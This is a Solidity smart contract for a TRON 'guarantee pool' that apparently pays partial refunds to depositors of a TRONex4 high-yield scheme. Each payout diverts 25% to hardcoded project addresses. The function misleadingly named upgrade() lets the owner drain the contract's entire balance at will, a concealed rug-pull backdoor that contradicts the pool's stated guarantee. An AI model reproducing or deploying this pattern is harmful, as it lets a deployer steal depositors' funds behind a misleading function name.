//SourceUnit: GuaranteePool.sol

pragma solidity 0.5.8;
//pragma solidity 0.6.3;



contract GuaranteePool {
	using SafeMath for uint256;
	
	mapping(uint256 => uint256) public poolWithdraw;
	
	mapping(address => uint256) public personalWithdraw;
	
	uint256 public totalWithdraw;
	
	address payable public  projectAddress;
	address payable public  projectFeeAddress;
	address  payable public  owner;
	
	TRONex4 public tronex4 ;
	
	
	event Withdrawn(address indexed user, uint256 amount);
	
	event Test(uint256 indexed id,uint256 value);
	
	constructor (address _tronex4)public {
		projectAddress = address(0x4161D36F6724AB037FB89799C3DD99A59996BD54BB);
		projectFeeAddress = address(0x418F9F239F5316BABA27D078A16EEE78AA0ABC8269);
		tronex4 = TRONex4(_tronex4);
		owner =  msg.sender;
	}
	
	function seTronex4Address(address _tronex4)public {
		require(msg.sender == owner,"Incorrect permissions, non-owner users");
		tronex4 = TRONex4(_tronex4);
	}
	
	function() external payable{	
	}
	
	function withdraw() public{
	    require(getGuaranteePoolStatus(),"tronex4 must be over");
	    require(address(this).balance >0 ," contract balance must mt 0");
	    uint256 userDeposit = getUserTotalDeposits(msg.sender);
		
		require(userDeposit > 0,"Deposit must mt 0");
	    
	    uint256 payBack10 = userDeposit.mul(10).div(100);
	    uint256 payBack20 = userDeposit.mul(20).div(100);
	    uint256 payBack30 = userDeposit.mul(30).div(100);
	    
	    //uint256 divid =  getUserDividends(msg.sender);
	    
	    uint256 tronex4UserWithdraw =  getUserWithdraw(msg.sender);
	    
	   // uint256 _back =  personalWithdraw[msg.sender].add(tronex4UserWithdraw).add(divid);
	    uint256 _back =  personalWithdraw[msg.sender].add(tronex4UserWithdraw);
	    
	    require(_back <= payBack30,"Only investment return less than 30%");
	    
	    uint256 maximumAmout60 = address(this).balance.add(totalWithdraw).mul(60).div(100);
	    uint256 maximumAmout30 = address(this).balance.add(totalWithdraw).mul(30).div(100);
	    uint256 maximumAmout10 = address(this).balance.add(totalWithdraw).mul(10).div(100);

	    uint256 userValue = 0;

	    if(_back <= payBack10){
	         userValue = payBack10.sub(_back);
	         if(maximumAmout60.sub(poolWithdraw[0]) <= userValue){
	           userValue = maximumAmout60.sub(poolWithdraw[0]);
	         }
            poolWithdraw[0] = poolWithdraw[0].add(userValue);
	    }else if(_back <= payBack20){
	        userValue = payBack20.sub(_back);
	        if(maximumAmout30.sub(poolWithdraw[1]) <= userValue){
	           userValue = maximumAmout30.sub(poolWithdraw[1]);
	        }
	        poolWithdraw[1] = poolWithdraw[1].add(userValue);
	    }else if(_back <= payBack30){
 	        userValue = payBack30.sub(_back);
	        if(maximumAmout10.sub(poolWithdraw[2]) <= userValue){
	           userValue = maximumAmout10.sub(poolWithdraw[2]);
	        }   
	        poolWithdraw[2] = poolWithdraw[2].add(userValue);
	    }
		
		
		if(userValue == 0){
		
			return;
		}
        personalWithdraw[msg.sender] = personalWithdraw[msg.sender].add(userValue);
		
		msg.sender.transfer(userValue.mul(75).div(100));
		
		
		emit Withdrawn(msg.sender,userValue.mul(75).div(100));
		
		projectFeeAddress.transfer(userValue.mul(5).div(100));
		projectAddress.transfer(userValue.mul(20).div(100));
        
	    totalWithdraw = totalWithdraw.add(userValue);
	    
	}
	//查询所有池子是否可以提现
	function getWithdrawStatus(address userAddress)public view returns(uint256){
		if(getGuaranteePoolStatus()){
			uint256 userDeposit = getUserTotalDeposits(userAddress);
			if(userDeposit == 0){
				return 0;
			}
			
			uint256 payBack10 = userDeposit.mul(10).div(100);
			uint256 payBack20 = userDeposit.mul(20).div(100);
			uint256 payBack30 = userDeposit.mul(30).div(100);
			
			//uint256 divid =  getUserDividends(userAddress);
	    
			uint256 tronex4UserWithdraw =  getUserWithdraw(userAddress);
			
			//uint256 _back =  personalWithdraw[userAddress].add(tronex4UserWithdraw).add(divid);
			
			uint256 _back =  personalWithdraw[userAddress].add(tronex4UserWithdraw);
			
			if(_back <= payBack10){
				return 1;
			}
			if(_back <= payBack20){
				return 2;
			}
			if(_back <= payBack30){
				return 3;
			}
		}else{
			return 0;
		}
		
	}
	
	function getPoolInfo() public view returns(uint256[6] memory poolInfo){
		
		poolInfo[0] = address(this).balance.add(totalWithdraw).mul(60).div(100);
	    poolInfo[1] = address(this).balance.add(totalWithdraw).mul(30).div(100);
	    poolInfo[2] = address(this).balance.add(totalWithdraw).mul(10).div(100);
		
		
		poolInfo[3] = poolWithdraw[0];
	    poolInfo[4] = poolWithdraw[1];
		poolInfo[5] = poolWithdraw[2];
		
	}
	
    
	function getGuaranteePoolStatus() public view returns(bool){
	   return tronex4.guaranteePoolStatus();
	}
	
    function getUserTotalDeposits(address userAddress) public view returns(uint256){
         return tronex4.getUserTotalDeposits(userAddress);
    }
    
    function getUserDividends(address userAddress) public view returns (uint256) {
        return tronex4.getUserDividends(userAddress);
    }
    
    function getUserWithdraw(address userAddress) public view returns(uint256) {
        return tronex4.userWithdraw(userAddress);      
    }
	

    
    function upgrade() public onlyOwner{
        owner.transfer(address(this).balance);
    }
	
		//慎重调用,消除管理员权限
	function renounceOwnership(address payable newOwner,uint256 index) public  onlyOwner {
		if(index == 1){
			owner = newOwner;		
		}else{
			owner = address(0);
		}
        
    }
	
	modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
	

}

interface  TRONex4{

   function guaranteePoolStatus() external view returns(bool);
   function userWithdraw(address userAddress) external view returns(uint256);
   function getUserTotalDeposits(address userAddress) external view returns(uint256);
   function getUserDividends(address userAddress) external view returns (uint256) ;
    
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * This test is non-exhaustive, and there may be false-negatives: during the
     * execution of a contract's constructor, its address will be reported as
     * not containing a contract.
     *
     * IMPORTANT: It is unsafe to assume that an address for which this
     * function returns false is an externally-owned account (EOA) and not a
     * contract.
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
       // bytes32 codehash;
        //bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
       // assembly { codehash := extcodehash(account) }
        //return (codehash != 0x0 && codehash != accountHash);
		
		
	   uint size;

       assembly { size := extcodesize(account) }

       return size > 0;
    }

    /**
     * @dev Converts an `address` into `address payable`. Note that this is
     * simply a type cast: the actual underlying value is not changed.
     *
     * _Available since v2.4.0._
     */
    function toPayable(address account) internal pure returns (address payable) {
        return address(uint160(account));
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     *
     * _Available since v2.4.0._
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-call-value
        (bool success, ) = recipient.call.value(amount)("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}